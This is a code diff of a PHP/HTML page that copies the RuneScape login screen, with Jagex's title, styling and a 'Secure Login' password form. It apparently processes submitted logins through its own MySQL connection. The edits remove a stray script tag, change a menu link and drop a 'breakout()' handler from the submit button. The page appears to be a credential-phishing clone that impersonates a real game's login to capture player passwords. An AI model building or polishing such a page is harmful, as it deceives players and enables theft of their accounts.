@@ -48,7 +48,6 @@ if (isset($_POST["login"])){
     mysqli_close($conn);
 }
 ?>
-</script>
 <title>RuneScape - the massive online adventure game by Jagex Ltd</title>
 <STYLE>BODY, TD, P{ font-family:Arial,Helvetica,sans-serif; font-size:13px;}.b {border-style:
    outset; border-width:3pt; border-color:#373737}.b2 {border-style: outset; border-width:3pt; border-color:#570700}.e {border:2px
@@ -87,7 +86,7 @@ if (isset($_POST["login"])){
                            <td class=e>
                               <center>
                                  <b>Secure Login</b><br>
-                                 <a href="title.html" class=c>Main Menu</a>
+                                 <a href="runescape.html" class=c>Main Menu</a>
                               </center>
                            </td>
                         </tr>
@@ -129,7 +128,7 @@ if (isset($_POST["login"])){
                                                    NAME="pass" SIZE="20" MAX="16"></TD>
                                              </TR>
                                              <TR>
-                                                <TD COLSPAN="2" ALIGN="right"><a href="frame.php" class=c target="_top"><INPUT TYPE="SUBMIT" onclick="breakout()" name="login"
+                                                <TD COLSPAN="2" ALIGN="right"><a href="frame.php" class=c target="_top"><INPUT TYPE="SUBMIT" name="login"
                                                                                                                                 VALUE="Secure Login"></a></TD>
                                              </TR>
                                             </form>
